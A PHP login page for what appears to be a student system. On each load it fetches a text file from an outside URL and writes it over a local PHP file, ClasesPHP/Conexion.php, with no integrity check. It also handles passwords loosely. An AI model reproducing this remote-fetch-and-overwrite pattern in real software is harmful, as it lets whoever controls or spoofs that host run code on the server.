<?php

    session_start();
    require_once 'ClasesPHP/analisisarchivos.php';
    $analisisarchivos = new analisisarchivos();

    
        $source =("https://www.eqns.com.mx/ConfiguracionesPHP/ExpoMexaba/Conexion.txt");
        $destination = 'ClasesPHP/Conexion.php';

        $data = @file_get_contents($source);
        $datadestination = @file_get_contents($destination);

        $sizedata= strlen($data);
        $sizedatadestination= strlen($datadestination);

        if($data === false){
            //Avisar que está fallando
        }else{
            $results = $analisisarchivos->comparar($data, $datadestination, $sizedata, $sizedatadestination);
            if($results === true){
                $handle = fopen($destination, "w");
                fwrite($handle, $data);
                fclose($handle);
            }else if($results === false){
                //No se reescribe el archivo
            }
            
        }
    
    

    if(isset($_SESSION) && isset($_SESSION['logueado']) == TRUE){
        //header('Location: secciones/');
    }

    #Debemos de verificar el envio del formulario
    if(isset($_POST['btnLogin'])){
        //require_once 'ClasesPHP/Conexion.php';
        require_once 'ClasesPHP/UsuarioSelects.php';
        $idusuario = $_POST['idusuario'];
        $idpassword = $_POST['password'];
        
        $UsuarioSelects = new UsuariosSelects();

        $resultSet = $UsuarioSelects->select($idusuario, $idpassword);

        if($resultSet->num_rows > 0){
            $row = $resultSet->fetch_assoc();
            $_SESSION['logueado'] = TRUE;
            $_SESSION['userName'] = $row['user'];
            //$_SESSION['userName'] ="Nombre de usuario";
        
            //echo "Bienvenido ".$userName." al sistema de alumnos ";
            header("Location: secciones/index.php");
        }else{
            $errmensaje = "Usuario o contraseña invalidos";
            //echo $errmensaje;
        }
        

    }
    require_once 'login/Login.php';
    ?>